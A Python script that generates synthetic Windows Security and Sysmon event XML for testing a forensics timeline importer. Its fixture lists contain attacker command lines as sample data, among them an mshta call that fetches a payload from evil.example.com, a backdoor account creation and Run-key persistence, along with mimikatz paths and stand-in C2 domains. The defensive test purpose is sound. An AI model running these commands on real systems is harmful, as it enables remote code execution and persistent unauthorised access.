#!/usr/bin/env python3
"""
Generate ~1.5 MB of Windows Event Log XML for DFIR-FENRIR timeline import testing.

Produces Security + System + Sysmon channels with realistic field values.
Capped above 2000 events so the MAX_EVENTS limit in parser.py is exercised.

Usage:
    python3 gen_evtl.py [output_path]
    Default output: /tmp/test_windows_events.xml
"""
import random
import sys
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta, timezone
from io import StringIO

NS = "http://schemas.microsoft.com/win/2004/08/events/event"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/test_windows_events.xml"

# ── Fixtures ──────────────────────────────────────────────────────────────────

HOSTNAMES  = ["DC01", "DC02", "WKSTN-ALICE", "WKSTN-BOB", "WKSTN-CHARLIE",
               "SRV-FILE01", "SRV-WEB01", "SRV-SQL01", "JUMPHOST01", "LAPTOP-MGMT"]
USERS      = ["alice", "bob", "charlie", "svc_backup", "svc_sql", "admin",
               "SYSTEM", "john.doe", "jane.smith", "t.miller"]
DOMAINS    = ["CORP", "CONTOSO", ".", "NT AUTHORITY"]
IPS        = ["10.0.0.5", "10.0.1.12", "10.0.2.99", "192.168.1.200",
               "203.0.113.45", "198.51.100.23", "10.100.10.50", "172.16.5.10"]
PROCESSES  = [r"C:\Windows\System32\cmd.exe",
               r"C:\Windows\System32\powershell.exe",
               r"C:\Windows\System32\wscript.exe",
               r"C:\Windows\System32\mshta.exe",
               r"C:\Windows\SysWOW64\rundll32.exe",
               r"C:\Windows\System32\svchost.exe",
               r"C:\Users\alice\Downloads\setup.exe",
               r"C:\Windows\System32\net.exe",
               r"C:\Windows\System32\reg.exe",
               r"C:\Windows\System32\lsass.exe"]
CMDLINES   = [r"powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1",
               r"cmd.exe /c whoami && net user",
               r'powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0',
               r"net user backdoor P@ssw0rd123 /add",
               r"reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d C:\temp\update.exe",
               r"mshta.exe http://evil.example.com/payload.hta",
               r"wscript.exe C:\Users\Public\doc.vbs",
               r"svchost.exe -k netsvcs",
               r"C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp",
               r"powershell.exe Get-Process | Export-Csv C:\temp\procs.csv"]
SYSMON_IMGS = [r"C:\Windows\System32\cmd.exe",
                r"C:\Windows\System32\powershell.exe",
                r"C:\Windows\SysWOW64\rundll32.exe",
                r"C:\Tools\mimikatz.exe",
                r"C:\Windows\System32\lsass.exe",
                r"C:\Users\alice\AppData\Roaming\implant.exe",
                r"C:\Windows\System32\regsvr32.exe"]
SERVICES   = ["WindowsUpdate", "ShadowSvc", "RemoteRegistry", "WinRM",
               "mal_persist", "svc_exfil", "NTDS", "Schedule"]
TASKS      = [r"\Microsoft\Windows\UpdateOrchestrator\Schedule Scan",
               r"\Microsoft\Windows\Defrag\ScheduledDefrag",
               r"\CORP\Backup",
               r"\mal_task",
               r"\exfil_daily"]
REG_KEYS   = [r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update",
               r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\backdoor",
               r"HKLM\SYSTEM\CurrentControlSet\Services\mal_persist\ImagePath",
               r"HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware"]
FILE_PATHS = [r"C:\Windows\Temp\stager.exe",
               r"C:\Users\Public\Documents\exfil.zip",
               r"C:\Windows\System32\drivers\rootkit.sys",
               r"C:\temp\cobalt.exe",
               r"C:\Users\alice\Downloads\invoice_scan.pdf.exe"]
DNS_NAMES  = ["evil.example.com", "c2.badactor.xyz", "update.legit.com",
               "exfil.ngrok.io", "beacon.attacker.top", "www.microsoft.com",
               "au.download.windowsupdate.com"]

rng = random.Random(42)

START_DT = datetime(2024, 11, 25, 7, 45, 0, tzinfo=timezone.utc)

record_id  = 1
event_dt   = START_DT


def rand(seq):
    return rng.choice(seq)


def ts(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "0000Z"  # 7-digit fraction


def advance(min_s=1, max_s=120):
    global event_dt
    event_dt += timedelta(seconds=rng.randint(min_s, max_s))
    return event_dt


def filetime(dt: datetime) -> int:
    epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
    return int((dt - epoch).total_seconds() * 10_000_000)


# ── Event builders ─────────────────────────────────────────────────────────────

def sys_el(eid: int, host: str, channel: str, provider: str, dt: datetime,
           pid: int = 556, tid: int = 1200) -> ET.Element:
    global record_id
    e = ET.Element("System")
    p = ET.SubElement(e, "Provider")
    p.set("Name", provider)
    ET.SubElement(e, "EventID").text = str(eid)
    ET.SubElement(e, "Version").text = "0"
    ET.SubElement(e, "Level").text = "0"
    ET.SubElement(e, "Task").text = "0"
    ET.SubElement(e, "Opcode").text = "0"
    ET.SubElement(e, "Keywords").text = "0x8020000000000000"
    tc = ET.SubElement(e, "TimeCreated")
    tc.set("SystemTime", ts(dt))
    ET.SubElement(e, "EventRecordID").text = str(record_id)
    record_id += 1
    ex = ET.SubElement(e, "Execution")
    ex.set("ProcessID", str(pid))
    ex.set("ThreadID", str(tid))
    ET.SubElement(e, "Channel").text = channel
    ET.SubElement(e, "Computer").text = host
    return e


def data_el(fields: dict) -> ET.Element:
    ed = ET.Element("EventData")
    for name, val in fields.items():
        d = ET.SubElement(ed, "Data")
        d.set("Name", name)
        d.text = str(val)
    return ed


def mk_event(eid: int, host: str, channel: str, provider: str,
             dt: datetime, fields: dict, pid: int = 556) -> ET.Element:
    ev = ET.Element("Event")
    ev.set("xmlns", NS)
    ev.append(sys_el(eid, host, channel, provider, dt, pid))
    ev.append(data_el(fields))
    return ev


# ── Specific event generators ──────────────────────────────────────────────────

def ev_4624():
    host = rand(HOSTNAMES)
    user = rand(USERS)
    dom  = rand(DOMAINS)
    ip   = rand(IPS)
    return mk_event(4624, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(1, 30), {
        "SubjectUserSid":    "S-1-0-0",
        "SubjectUserName":   "-",
        "SubjectDomainName": "-",
        "SubjectLogonId":    "0x0",
        "TargetUserSid":     f"S-1-5-21-{rng.randint(1000,9999)}-{rng.randint(1000,9999)}-{rng.randint(1000,9999)}-1001",
        "TargetUserName":    user,
        "TargetDomainName":  dom,
        "LogonType":         str(rng.choice([2, 3, 10])),
        "IpAddress":         ip,
        "IpPort":            str(rng.randint(1024, 65535)),
        "ProcessName":       rand(PROCESSES),
        "WorkstationName":   host,
    })


def ev_4625():
    host = rand(HOSTNAMES)
    user = rand(USERS)
    dom  = rand(DOMAINS)
    ip   = rand(IPS)
    return mk_event(4625, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(1, 10), {
        "SubjectUserName":   "-",
        "TargetUserName":    user,
        "TargetDomainName":  dom,
        "LogonType":         "3",
        "FailureReason":     "%%2313",
        "Status":            "0xc000006d",
        "SubStatus":         "0xc0000064",
        "IpAddress":         ip,
        "IpPort":            str(rng.randint(1024, 65535)),
        "WorkstationName":   host,
    })


def ev_4648():
    host = rand(HOSTNAMES)
    src  = rand(USERS)
    tgt  = rand(USERS)
    ip   = rand(IPS)
    return mk_event(4648, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(2, 20), {
        "SubjectUserName":  src,
        "SubjectDomainName": rand(DOMAINS),
        "TargetUserName":   tgt,
        "TargetDomainName": rand(DOMAINS),
        "TargetServerName": rand(HOSTNAMES),
        "IpAddress":        ip,
        "ProcessName":      rand(PROCESSES),
    })


def ev_4672():
    user = rand(USERS)
    return mk_event(4672, rand(HOSTNAMES), "Security",
                    "Microsoft-Windows-Security-Auditing", advance(1, 5), {
        "SubjectUserName": user,
        "SubjectDomainName": rand(DOMAINS),
        "SubjectLogonId":  hex(rng.randint(0x100000, 0xFFFFFF)),
        "PrivilegeList":   "SeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege",
    })


def ev_4688():
    host = rand(HOSTNAMES)
    proc = rand(PROCESSES)
    cmd  = rand(CMDLINES)
    user = rand(USERS)
    parent = rand(PROCESSES)
    return mk_event(4688, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(1, 30), {
        "SubjectUserName":    user,
        "SubjectDomainName":  rand(DOMAINS),
        "NewProcessId":       hex(rng.randint(0x1000, 0xFFFF)),
        "NewProcessName":     proc,
        "CommandLine":        cmd,
        "ParentProcessName":  parent,
        "TokenElevationType": "%%1936",
        "ProcessId":          hex(rng.randint(0x100, 0xFFF)),
    })


def ev_4697():
    host = rand(HOSTNAMES)
    svc  = rand(SERVICES)
    img  = rand(PROCESSES)
    user = rand(USERS)
    return mk_event(4697, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(5, 120), {
        "SubjectUserName":   user,
        "SubjectDomainName": rand(DOMAINS),
        "ServiceName":       svc,
        "ServiceFileName":   img,
        "ServiceType":       "0x10",
        "ServiceStartType":  "2",
        "ServiceAccount":    "LocalSystem",
    })


def ev_4698():
    host = rand(HOSTNAMES)
    task = rand(TASKS)
    user = rand(USERS)
    return mk_event(4698, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(10, 300), {
        "SubjectUserName":  user,
        "SubjectDomainName": rand(DOMAINS),
        "TaskName":         task,
        "TaskContent":      "<Task><Actions><Exec><Command>powershell.exe</Command></Exec></Actions></Task>",
    })


def ev_4720():
    host = rand(HOSTNAMES)
    user = rand(USERS)
    new_user = f"newuser{rng.randint(100, 999)}"
    return mk_event(4720, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(5, 60), {
        "SubjectUserName":   user,
        "SubjectDomainName": rand(DOMAINS),
        "TargetUserName":    new_user,
        "TargetDomainName":  rand(DOMAINS),
        "PrivilegeList":     "-",
    })


def ev_4728():
    host = rand(HOSTNAMES)
    user = rand(USERS)
    return mk_event(4728, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(5, 60), {
        "MemberSid":        f"S-1-5-21-{rng.randint(1000,9999)}-{rng.randint(1000,9999)}-{rng.randint(1000,9999)}-{rng.randint(1000,9999)}",
        "MemberName":       f"CN={rand(USERS)},DC=contoso,DC=com",
        "TargetUserName":   rand(USERS),
        "TargetDomainName": rand(DOMAINS),
        "GroupName":        rng.choice(["Domain Admins", "Enterprise Admins", "Administrators"]),
        "SubjectUserName":  user,
        "SubjectDomainName": rand(DOMAINS),
    })


def ev_4768():
    host = rand(HOSTNAMES)
    user = rand(USERS)
    ip   = rand(IPS)
    return mk_event(4768, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(1, 30), {
        "TargetUserName":   user,
        "TargetDomainName": rand(DOMAINS),
        "ServiceName":      "krbtgt",
        "IpAddress":        f"::{ip}",
        "Status":           rng.choice(["0x0", "0x0", "0x0", "0x18", "0x25"]),
    })


def ev_4776():
    host  = rand(HOSTNAMES)
    user  = rand(USERS)
    ip    = rand(IPS)
    code  = rng.choice(["0x0", "0x0", "0x0", "0xC0000064", "0xC000006A"])
    return mk_event(4776, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(1, 15), {
        "PackageName":       "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0",
        "TargetUserName":    user,
        "Workstation":       rand(HOSTNAMES),
        "Status":            code,
    })


def ev_1102():
    host = rand(HOSTNAMES)
    user = rand(USERS)
    return mk_event(1102, host, "Security",
                    "Microsoft-Windows-Eventlog", advance(1, 5), {
        "SubjectUserName":   user,
        "SubjectDomainName": rand(DOMAINS),
        "SubjectLogonId":    hex(rng.randint(0x100000, 0xFFFFFF)),
    })


def ev_7045():
    host = rand(HOSTNAMES)
    svc  = rand(SERVICES)
    img  = rand(PROCESSES)
    return mk_event(7045, host, "System",
                    "Service Control Manager", advance(5, 120), {
        "ServiceName":    svc,
        "ImagePath":      img,
        "ServiceType":    "user mode service",
        "StartType":      "demand start",
        "AccountName":    "LocalSystem",
    })


def ev_4719():
    host = rand(HOSTNAMES)
    user = rand(USERS)
    return mk_event(4719, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(1, 30), {
        "SubjectUserName":  user,
        "SubjectDomainName": rand(DOMAINS),
        "CategoryId":       "%%8273",
        "SubcategoryId":    "%%13312",
        "SubcategoryGuid":  "{0CCE922B-69AE-11D9-BED3-505054503030}",
        "AuditPolicyChanges": "%%8448",
    })


def ev_4663():
    host = rand(HOSTNAMES)
    user = rand(USERS)
    obj  = rand(FILE_PATHS)
    return mk_event(4663, host, "Security",
                    "Microsoft-Windows-Security-Auditing", advance(1, 60), {
        "SubjectUserName":  user,
        "SubjectDomainName": rand(DOMAINS),
        "ObjectName":       obj,
        "ObjectType":       "File",
        "AccessList":       "%%4417\n\t\t\t%%4418",
        "ProcessName":      rand(PROCESSES),
    })


# Sysmon events

def ev_sysmon1():
    host = rand(HOSTNAMES)
    img  = rand(SYSMON_IMGS)
    cmd  = rand(CMDLINES)
    user = rand(USERS)
    parent = rand(SYSMON_IMGS)
    return mk_event(1, host, "Microsoft-Windows-Sysmon/Operational",
                    "Microsoft-Windows-Sysmon", advance(1, 30), {
        "UtcTime":         ts(event_dt),
        "ProcessGuid":     f"{{{rng.randint(10000,99999):05X}-{rng.randint(10000,99999):04X}-{rng.randint(10000,99999):04X}-{rng.randint(10000,99999):04X}}}",
        "ProcessId":       str(rng.randint(1000, 65000)),
        "Image":           img,
        "CommandLine":     cmd,
        "User":            f"{rand(DOMAINS)}\\{user}",
        "ParentProcessId": str(rng.randint(100, 9999)),
        "ParentImage":     parent,
        "ParentCommandLine": rand(CMDLINES),
        "Hashes":          f"MD5={rng.randbytes(16).hex()},SHA256={rng.randbytes(32).hex()}",
    })


def ev_sysmon3():
    host = rand(HOSTNAMES)
    img  = rand(SYSMON_IMGS)
    dst  = rand(IPS)
    return mk_event(3, host, "Microsoft-Windows-Sysmon/Operational",
                    "Microsoft-Windows-Sysmon", advance(1, 60), {
        "UtcTime":          ts(event_dt),
        "Image":            img,
        "User":             f"{rand(DOMAINS)}\\{rand(USERS)}",
        "Protocol":         "tcp",
        "SourceIp":         rand(IPS),
        "SourcePort":       str(rng.randint(1024, 65535)),
        "DestinationIp":    dst,
        "DestinationPort":  str(rng.choice([80, 443, 4444, 8080, 8443, 1337, 53])),
        "DestinationHostname": rand(DNS_NAMES),
        "Initiated":        "true",
    })


def ev_sysmon8():
    host = rand(HOSTNAMES)
    src  = rand(SYSMON_IMGS)
    tgt  = rand(SYSMON_IMGS)
    return mk_event(8, host, "Microsoft-Windows-Sysmon/Operational",
                    "Microsoft-Windows-Sysmon", advance(1, 30), {
        "UtcTime":          ts(event_dt),
        "SourceProcessId":  str(rng.randint(1000, 65000)),
        "SourceImage":      src,
        "TargetProcessId":  str(rng.randint(1000, 65000)),
        "TargetImage":      tgt,
        "NewThreadId":      str(rng.randint(100, 9999)),
        "StartAddress":     hex(rng.randint(0x7FF000000000, 0x7FFFFFFFFFFF)),
    })


def ev_sysmon10():
    host = rand(HOSTNAMES)
    src  = rand(SYSMON_IMGS)
    return mk_event(10, host, "Microsoft-Windows-Sysmon/Operational",
                    "Microsoft-Windows-Sysmon", advance(1, 15), {
        "UtcTime":          ts(event_dt),
        "SourceProcessId":  str(rng.randint(1000, 65000)),
        "SourceImage":      src,
        "TargetProcessId":  str(rng.randint(1000, 65000)),
        "TargetImage":      r"C:\Windows\System32\lsass.exe",
        "GrantedAccess":    rng.choice(["0x1010", "0x1410", "0x1fffff"]),
        "CallTrace":        f"C:\\Windows\\System32\\ntdll.dll+{hex(rng.randint(0x1000, 0xFFFF))}",
    })


def ev_sysmon11():
    host = rand(HOSTNAMES)
    img  = rand(SYSMON_IMGS)
    fpath = rand(FILE_PATHS)
    return mk_event(11, host, "Microsoft-Windows-Sysmon/Operational",
                    "Microsoft-Windows-Sysmon", advance(1, 30), {
        "UtcTime":          ts(event_dt),
        "ProcessId":        str(rng.randint(1000, 65000)),
        "Image":            img,
        "TargetFilename":   fpath,
        "CreationUtcTime":  ts(event_dt),
    })


def ev_sysmon12():
    host = rand(HOSTNAMES)
    img  = rand(SYSMON_IMGS)
    key  = rand(REG_KEYS)
    return mk_event(12, host, "Microsoft-Windows-Sysmon/Operational",
                    "Microsoft-Windows-Sysmon", advance(1, 30), {
        "UtcTime":          ts(event_dt),
        "EventType":        rng.choice(["CreateKey", "DeleteKey"]),
        "ProcessId":        str(rng.randint(1000, 65000)),
        "Image":            img,
        "TargetObject":     key,
    })


def ev_sysmon13():
    host = rand(HOSTNAMES)
    img  = rand(SYSMON_IMGS)
    key  = rand(REG_KEYS)
    return mk_event(13, host, "Microsoft-Windows-Sysmon/Operational",
                    "Microsoft-Windows-Sysmon", advance(1, 30), {
        "UtcTime":          ts(event_dt),
        "EventType":        "SetValue",
        "ProcessId":        str(rng.randint(1000, 65000)),
        "Image":            img,
        "TargetObject":     key,
        "Details":          rand(CMDLINES)[:100],
    })


def ev_sysmon22():
    host = rand(HOSTNAMES)
    img  = rand(SYSMON_IMGS)
    qname = rand(DNS_NAMES)
    return mk_event(22, host, "Microsoft-Windows-Sysmon/Operational",
                    "Microsoft-Windows-Sysmon", advance(1, 30), {
        "UtcTime":          ts(event_dt),
        "ProcessId":        str(rng.randint(1000, 65000)),
        "Image":            img,
        "QueryName":        qname,
        "QueryStatus":      "0",
        "QueryResults":     rand(IPS),
    })


# ── Event mix weights ──────────────────────────────────────────────────────────

GENERATORS = [
    (ev_4624, 18),   # frequent logons
    (ev_4625, 8),    # some failures
    (ev_4648, 4),    # explicit creds
    (ev_4672, 6),    # special privileges
    (ev_4688, 14),   # process creation (lots)
    (ev_4697, 2),    # service install
    (ev_4698, 2),    # scheduled task
    (ev_4720, 1),    # account created
    (ev_4728, 1),    # group member added
    (ev_4768, 4),    # Kerberos TGT
    (ev_4776, 5),    # NTLM auth
    (ev_1102, 1),    # log cleared
    (ev_7045, 2),    # service installed (system)
    (ev_4719, 1),    # audit policy changed
    (ev_4663, 4),    # object access
    (ev_sysmon1,  8),  # process creation
    (ev_sysmon3,  6),  # network connection
    (ev_sysmon8,  2),  # remote thread
    (ev_sysmon10, 2),  # process access (lsass)
    (ev_sysmon11, 4),  # file created
    (ev_sysmon12, 3),  # registry create
    (ev_sysmon13, 3),  # registry set
    (ev_sysmon22, 5),  # DNS query
]

# Build weighted pool
pool: list = []
for fn, weight in GENERATORS:
    pool.extend([fn] * weight)

# ── Generate ───────────────────────────────────────────────────────────────────

TARGET_BYTES = 1_572_864  # 1.5 MiB

# Probe average event size with 100 samples
probe_buf = StringIO()
for _ in range(100):
    fn = rng.choice(pool)
    el = fn()
    probe_buf.write(ET.tostring(el, encoding="unicode"))
avg_bytes = len(probe_buf.getvalue().encode()) // 100

target_events = max(TARGET_BYTES // avg_bytes, 2050)
print(f"Avg event size: {avg_bytes} bytes → generating {target_events} events (cap test at 2000)")

# Build the document
out = StringIO()
out.write('<?xml version="1.0" encoding="UTF-8"?>\n')
out.write('<Events>\n')

for i in range(target_events):
    fn = rng.choice(pool)
    el = fn()
    out.write("  ")
    out.write(ET.tostring(el, encoding="unicode"))
    out.write("\n")

out.write('</Events>\n')

data = out.getvalue().encode("utf-8")
size_mb = len(data) / 1_048_576

with open(OUT, "wb") as f:
    f.write(data)

print(f"Written {len(data):,} bytes ({size_mb:.2f} MB) → {OUT}")
print(f"Events: {target_events} (parser MAX_EVENTS cap = 2000 — will exercise truncation)")
